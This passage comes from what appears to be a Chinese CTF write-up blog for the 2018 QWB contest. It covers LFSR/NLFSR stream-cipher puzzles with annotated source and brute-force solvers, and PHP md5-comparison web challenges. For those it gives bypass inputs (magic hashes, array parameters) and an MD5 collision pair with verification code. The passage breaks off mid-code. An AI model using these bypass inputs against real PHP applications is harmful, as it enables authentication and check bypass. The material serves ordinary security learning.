<span class="title">crack</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> maybe <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">21</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        R=maybe</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> xrange(len(key)):</span><br><span class="line">            tmp=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                (R,out)=nlfsr(R,mask)</span><br><span class="line">                tmp=(tmp&lt;&lt;<span class="number">1</span>)^out</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)!=key[index]:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%bin(maybe)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">crack(open(<span class="string">"key"</span>,<span class="string">'r'</span>).read())</span><br><span class="line"><span class="comment">#flag&#123;100100111010101101011&#125;</span></span><br></pre></td></tr></table></figure><h2 id="nextrsa"><a href="#nextrsa" class="headerlink" title="nextrsa"></a>nextrsa</h2><blockquote><p>nc 39.107.33.90 9999</p></blockquote><p>这是一个RSA相关安全问题的合集，是个很有意思值得一做的题目。</p><p>题目源码已公开在GitHub：<a href="https://github.com/fpbibi/nextrsa" target="_blank" rel="noopener">https://github.com/fpbibi/nextrsa</a></p><p>可参考以下链接：</p><ul><li><a href="http://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">http://www.cnblogs.com/WangAoBo/p/8654120.html</a></li><li><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84632</a></li><li><a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/</a></li><li><a href="https://bbs.ichunqiu.com/thread-36705-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-36705-1-1.html</a></li></ul><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><h3 id="The-Fisrt-Easy-Md5-Challenge"><a href="#The-Fisrt-Easy-Md5-Challenge" class="headerlink" title="The Fisrt Easy Md5 Challenge"></a>The Fisrt Easy Md5 Challenge</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&apos;param1&apos;]!=$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用PHP弱类型或者数组绕过。</p><p>post <code>param1=QNKCDZO&amp;param2=240610708</code> 或者 <code>param1[]=&amp;param2[]=0</code> 。</p><h3 id="The-Second-Easy-Md5-Challenge"><a href="#The-Second-Easy-Md5-Challenge" class="headerlink" title="The Second Easy Md5 Challenge"></a>The Second Easy Md5 Challenge</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&apos;param1&apos;]!==$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用PHP数组绕过。post <code>param1[]=&amp;param2[]=0</code> 。</p><h3 id="Md5-Revenge-Now"><a href="#Md5-Revenge-Now" class="headerlink" title="Md5 Revenge Now!"></a>Md5 Revenge Now!</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕不过去，但是因为哈希是从无限集到有限集的映射，必然存在两个不同的消息拥有相同的哈希值，而且这种消息对已经可以被构造了。（工具： <a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a> ）</p><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="string">"4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2"</span></span><br><span class="line">s2=<span class="string">"4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2"</span></span><br><span class="line">y=<span class="keyword">lambda</span> s: <span class="string">"%"</span>+<span class="string">"%"</span>.join([s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)/<span class="number">2</span>)])</span><br><span class="line"><span class="keyword">print</span> y(s1)</span><br><span class="line"><span class="keyword">print</span> y(s2)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$param1=urldecode(<span class="string">"%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2"</span>);</span><br><span class="line">$param2=urldecode(<span class="string">"%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2"</span>);</span><br><span class="line"><span class="keyword">print</span> md5($param1).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">print</span> md5($param2).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">print</span> md5($param1)===md5($param2);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure><p><img src="1522986666339.png" alt="1522986666339"></p><h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><ul><li><p><a href="QWB_18h2f8018b2749786138460y893uy3gqf894n7xc891754">Welcome</a> </p></li><li><p><a href="StreamGame1_zip_1y829eyn1723891s827h3 -.zip">streamgame1</a> </p></li><li><p><a href="StreamGame2_zip_12983yrbhsauibf1o8374tybchsd21.zip">streamgame2</a></p></li><li><p><a href="StreamGame3_0">streamgame3</a> </p></li><li><p><a href="StreamGame4_zip_fjh382901fu3n8.zip">streamgame4</a> </p></li></ul><h1 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h1><p><a href="https://github.com/jas502n/2018-QWB-CTF" target="_blank" rel="noopener">https://github.com/jas502n/2018-QWB-CTF</a>  </p><p>stream</p><h1 id="奇怪的心路"><a href="#奇怪的心路" class="headerlink" title="奇怪的心路~"></a>奇怪的心路~</h1><p><strong><em>streamgame3.py</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">"flag&#123;"</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span> len(flag)==<span class="number">24</span></span><br><span class="line"><span class="comment"># flag共24个字符，形如 /flag&#123;.&#123;18&#125;&#125;/</span></span><br><span class="line"><span class="comment"># 中间18个字符就是我们想寻找的lfsr初始状态</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    <span class="string">"""定义了一个lfsr的状态变化规则</span></span><br><span class="line"><span class="string">    输入是寄存器当前存储的状态信息和一个掩码，</span></span><br><span class="line"><span class="string">    两者经过一定运算得到寄存器下一个状态并输出</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span> </span><br><span class="line">    <span class="comment">#将当前值左移一位，并舍弃超出 24bit 的部分</span></span><br><span class="line">    <span class="comment">#这就是线性反馈移位寄存器的 `移位` 部分</span></span><br><span class="line">    <span class="comment">#可以理解为 output = (R * 2) % 0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    <span class="comment">#将当前值和掩码按位与，只使用某些固定位的信息</span></span><br><span class="line">    <span class="comment">#如对于 R3_mask=0x100002 ，只使用当前值左起第四位和右起第二位</span></span><br><span class="line">    <span class="comment">#对比线性函数的定义，发现0x100002的每一位对应的就是f中的a1,a2,...,a24，</span></span><br><span class="line">    <span class="comment">#其中a4=a23=1,a1=a2=a3=a5=...=a22=a24=0</span></span><br><span class="line">    <span class="comment">#而R的每一位对应的是b1,b2,...b24</span></span><br><span class="line">    <span class="comment">#那么 `R&amp;mask` 就将f中用于异或的每一项都求出来并保存在i的每一位中</span></span><br><span class="line">    <span class="comment">#（我认为 `&amp;0xffffff` 是多余的，R和mask都总在24位以内）</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="comment"># lastbit实际上是函数中的a0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>) </span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="comment"># 这个循环用于取出i中的每一位并完成异或操作，i中有奇数个1则lastbit为1，反之为0</span></span><br><span class="line">    <span class="comment"># 得到的lastbit就是【寄存器当前状态的线性函数】f的函数值</span></span><br><span class="line">    <span class="comment"># lastbit就是所谓的 `线性反馈` ，它与寄存器当前状态线性相关，</span></span><br><span class="line">    <span class="comment"># 并作为输入位，用以产生寄存器的下一个状态</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="comment"># 产生寄存器的下一个状态</span></span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span>:</span></span><br><span class="line">    <span class="string">"""完成三个线性反馈移位寄存器的一次状态变换</span></span><br><span class="line"><span class="string">    并将三个反馈进行简单运算（x1x2 ^ x2'x3）后返回</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    --【我现在明白过来了，我在</span></span><br><span class="line"><span class="string">    http://findneo.github.io/180325QWBWP/#streamgame3</span></span><br><span class="line"><span class="string">    中提到的一个失败的尝试为什么会失败，：）</span></span><br><span class="line"><span class="string">    就是因为最后文件中保存的每个bit都只是这个简单运算的结果</span></span><br><span class="line"><span class="string">    而这个简单的运算导致了每个single_round中反馈的信息</span></span><br><span class="line"><span class="string">    从3个bit降到了1个bit】--</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    (R1_NEW,x1)=lfsr(R1,R1_mask)</span><br><span class="line">    (R2_NEW,x2)=lfsr(R2,R2_mask)</span><br><span class="line">    (R3_NEW,x3)=lfsr(R3,R3_mask)</span><br><span class="line">    <span class="keyword">return</span> (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^<span class="number">1</span>)*x3))</span><br><span class="line"></span><br><span class="line">R1=int(flag[<span class="number">5</span>:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line">R2=int(flag[<span class="number">11</span>:<span class="number">17</span>],<span class="number">16</span>)</span><br><span class="line">R3=int(flag[<span class="number">17</span>:<span class="number">23</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span> len(bin(R1)[<span class="number">2</span>:])==<span class="number">17</span></span><br><span class="line"><span class="keyword">assert</span> len(bin(R2)[<span class="number">2</span>:])==<span class="number">19</span></span><br><span class="line"><span class="keyword">assert</span> len(bin(R3)[<span class="number">2</span>:])==<span class="number">21</span></span><br><span class="line">R1_mask=<span class="number">0x10020</span></span><br><span class="line">R2_mask=<span class="number">0x4100c</span></span><br><span class="line">R3_mask=<span class="number">0x100002</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fi <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">print</span> fi</span><br><span class="line">    tmp1mb=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">        tmp1kb=<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">            tmp=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span><br><span class="line">                tmp = (tmp &lt;&lt; <span class="number">1</span>) ^ out</span><br><span class="line">            tmp1kb+=chr(tmp)</span><br><span class="line">        tmp1mb+=tmp1kb</span><br><span class="line">    f = open(<span class="string">"./output/"</span> + str(fi), <span class="string">"ab"</span>)</span><br><span class="line">    f.write(tmp1mb)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p><strong><em>solution</em></strong></p><p>因为抽头较少，所以生成序列的每一位都只和初始状态的少数几位有关，如果每一轮分开考虑，再手动合并初始状态，遍历集合会小非常多。折腾了很久才发现自己要写的是递归，写了很多代码但是不work🤔，到比赛最后也没调出来。</p><p>赛后总算按我的意愿跑起来了，但是马上发现自己太天真，这代码就是跑到爆栈也没办法得到结果，看来还是要认真理解原理，从算法上突破，暴力 x 不可取。下面是我已被证明不可取的想法（我居然在试图攻破安全高效的伪随机序列发生器，真是naive啊）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="comment"># 因为掩码的原因，大大降低了计算的复杂度。我们可以在每次规约运算时只遍历影响结果的位，而忽略其他将被掩码忽略的位。</span></span><br><span class="line"><span class="comment"># 这样实际上复杂度从每一次规约都有2**（17+19+21）=2**57约10**18种可能降低到了每一位约大概2**8种可能！</span></span><br><span class="line"><span class="comment"># 对我来说，编程实现的难点在于如何控制只遍历影响结果的位，一种是在原来的基础上加一个判断，判断是否该情况已被考虑，这应该不合适。</span></span><br><span class="line"><span class="comment"># 另一种就是用一个list装R的每一位</span></span><br><span class="line"><span class="comment"># 再有就是手动组合三个部分的每次反馈</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span>:</span> </span><br><span class="line">    (R1_NEW,x1)=lfsr(R1,R1_mask)</span><br><span class="line">    (R2_NEW,x2)=lfsr(R2,R2_mask)</span><br><span class="line">    (R3_NEW,x3)=lfsr(R3,R3_mask)</span><br><span class="line">    <span class="keyword">return</span> (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^<span class="number">1</span>)*x3)) <span class="comment"># lastbit=(R.count(1)%2?1:0)  R*右边加一位lastbit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># R1sm means R1_sub_mask</span></span><br><span class="line">R1_mask=<span class="number">0x10020</span>;R1sm=[];R1sm.extend([<span class="number">0x10000</span>,<span class="number">0x20</span>])</span><br><span class="line">R2_mask=<span class="number">0x4100c</span>;R2sm=[];R2sm.extend([<span class="number">0x40000</span>,<span class="number">0x1000</span>,<span class="number">0x8</span>,<span class="number">0x4</span>])</span><br><span class="line">R3_mask=<span class="number">0x100002</span>;R3sm=[];R3sm.extend([<span class="number">0x100000</span>,<span class="number">0x2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genAll</span><span class="params">(Rsm)</span>:</span></span><br><span class="line">    <span class="comment"># 全组合</span></span><br><span class="line">    all_iter=[itertools.combinations(Rsm,num) <span class="keyword">for</span> num <span class="keyword">in</span> xrange(len(Rsm)+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> itertools.chain.from_iterable(all_iter)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genBit</span><span class="params">(sub_mask,seq,mask)</span>:</span></span><br><span class="line">    ret=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_mask:</span><br><span class="line">        ret|=i</span><br><span class="line">    done=mask</span><br><span class="line">    <span class="keyword">if</span> seq==<span class="number">0</span>:done=<span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(seq):</span><br><span class="line">            done|=(mask&gt;&gt;i)</span><br><span class="line">    ret&amp;=(done^<span class="number">0xffffff</span>)&amp;(<span class="number">0xffffff</span>&lt;&lt;seq)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">digui</span><span class="params">(level,R1,R2,R3)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> level==<span class="number">996</span>:</span><br><span class="line">        <span class="keyword">print</span> hex(R1),hex(R2),hex(R3)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> g,h,n <span class="keyword">in</span> itertools.product(genAll(R1sm),genAll(R2sm),genAll(R3sm)):</span><br><span class="line">        R1|=genBit(g,level,R1_mask)</span><br><span class="line">        R2|=genBit(h,level,R2_mask)</span><br><span class="line">        R3|=genBit(n,level,R3_mask)</span><br><span class="line">        (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span><br><span class="line">        <span class="keyword">if</span> out==((ord(f[level/<span class="number">8</span>])&gt;&gt;(<span class="number">7</span>-(level%<span class="number">8</span>)))&amp;<span class="number">0x1</span>):</span><br><span class="line">            digui(level+<span class="number">1</span>,R1,R2,R3)</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"output/0"</span>).read()</span><br><span class="line">digui(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>据说是考察快速相关攻击，与WHCTF一题相似，在 <a href="https://www.xctf.org.cn/library/details/whctf-writeup/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/whctf-writeup/</a> 搜索Bornpig即可看到相关信息。</p><p>我还找到一些相关信息，但暂时没有时间深入解决。</p><ul><li><a href="https://download.csdn.net/download/weixin_38627405/10033503" target="_blank" rel="noopener">快速相关攻击报告</a></li><li><a href="https://www.jianshu.com/p/7bb9c0d057be" target="_blank" rel="noopener">关于线性移位寄存器和快速相关攻击中的算法A和算法B详细分析解答</a></li><li><a href="https://blog.csdn.net/ACdreamers/article/details/44656743" target="_blank" rel="noopener">线性反馈移位寄存器与梅森旋转算法</a></li><li><a href="http://zzs.ujs.edu.cn/xbzkb/CN/article/downloadArticleFile.do?attachType=PDF&amp;id=1440" target="_blank" rel="noopener">流密码快速相关攻击综述</a></li></ul><p>去了解了一下线性反馈移位寄存器，理解一些概念，对代码做了些注释。</p><ul><li>In <a href="https://en.wikipedia.org/wiki/Electronics" target="_blank" rel="noopener">electronics</a>, a <strong>flip-flop</strong> or <strong>latch</strong> is a <a href="https://en.wikipedia.org/wiki/Electronic_circuit" target="_blank" rel="noopener">circuit</a> that has two stable states and can be used to store state information.<br>flip-flop（触发器）或latch（锁存器）都是某种电路，都根据输入改变存储的状态信息，区别是前者当时钟有效时改变才发生，也就是同步的，后者是时钟无关的，也就是异步的。</li><li>a <strong>shift register</strong> is a cascade of <a href="https://en.wikipedia.org/wiki/Flip-flop_(electronics" target="_blank" rel="noopener">flip flops</a>) 。<br>移位寄存器是触发器的级联。</li><li>In <a href="https://en.wikipedia.org/wiki/Computing" target="_blank" rel="noopener">computing</a>, a <strong>linear-feedback shift register</strong> (LFSR) is a <a href="https://en.wikipedia.org/wiki/Shift_register" target="_blank" rel="noopener">shift register</a> whose input bit is a <a href="https://en.wikipedia.org/wiki/Linear#Boolean_functions" target="_blank" rel="noopener">linear function</a> of its previous state.<br>线性反馈移位寄存器是一个移位寄存器，它的输入位是它先前状态的线性函数。</li><li>线性指的是齐次性（<code>f(αx) = αf(x) for all α</code>）和可加性（<code>f(x + y) = f(x) + f(y)</code>），两者在有理数域是等价的。上述定义中的线性函数实际上指的是布尔代数中的线性函数，形式上这样表述：<br>对于<img src="1536909203599.png" alt="1536909203599"> ，存在 <img src="1536909278873.png" alt="1536909278873"> ，使得<img src="1536909303104.png" alt="1536909303104">，那么<code>f</code> 是一个线性函数。（其中的符号分别表示<code>逻辑异或</code>和<code>逻辑与</code> ，详情如下图）</li></ul><p><img src="./" alt="52229954019"></p><p><del>有一位朋友在<a href="http://blog.kyrios.cn/2018/03/29/2018-qwb-cnss-wp/#s3" target="_blank" rel="noopener">这篇文章</a>提到一种基于<code>outbit=(x1*x2)^((x2^1)*x3)</code> 从而当<code>x1==x3</code> 时<code>x1==outbit</code> 来略过R2而只爆破R1和R3的做法，我实现了一下，感觉复杂度仍然不可接受。</del>~~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R1_mask=<span class="number">0x10020</span></span><br><span class="line">R2_mask=<span class="number">0x4100c</span></span><br><span class="line">R3_mask=<span class="number">0x100002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s=<span class="string">''</span>.join([bin(ord(i))[<span class="number">2</span>].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> open(<span class="string">"output/0"</span>,<span class="string">"rb"</span>).read()])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle1</span><span class="params">(start,step)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(start,start+step):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">2</span>**<span class="number">20</span>,<span class="number">2</span>**<span class="number">21</span>):</span><br><span class="line">            R1,R3,flag=i,j,<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(len(s)):</span><br><span class="line">                R1,out1=lfsr(R1,R1_mask)</span><br><span class="line">                R3,out3=lfsr(R3,R3_mask)</span><br><span class="line">                <span class="keyword">if</span> out1==out3 <span class="keyword">and</span> out1!=s[offset]:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"flag&#123;%s******%s&#125;"</span>%(bin(i)[<span class="number">2</span>:],bin(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="keyword">print</span> 